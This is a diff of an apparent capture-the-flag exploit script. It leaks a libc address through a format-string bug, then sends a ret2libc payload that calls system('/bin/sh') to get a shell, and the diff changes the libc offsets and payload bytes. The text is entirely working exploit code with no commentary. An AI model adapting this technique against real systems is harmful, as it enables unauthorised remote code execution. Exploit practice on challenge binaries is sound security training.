@@ -8,9 +8,9 @@ while True:
 		p.send("%19$p")
 		libc_base=int(p.recv(10),16)-0x18637
 		one=libc_base+0x3AC69
-		system = libc_base +  0x03ADA0
-		binsh = libc_base +  0x15BA0B
-		payload=p32(one)+p32(0) + p32(binsh)+"\x00"*0x18+'\x4C'
+		system = libc_base +  0x03A940
+		binsh = libc_base +  0x15902B
+		payload=p32(system)+p32(0) + p32(binsh)+"\x00"*0x18+'\x24'
 		p.send(payload)
 		p.recvuntil('Have you got the shell yet? :)')
 		sleep(0.01)
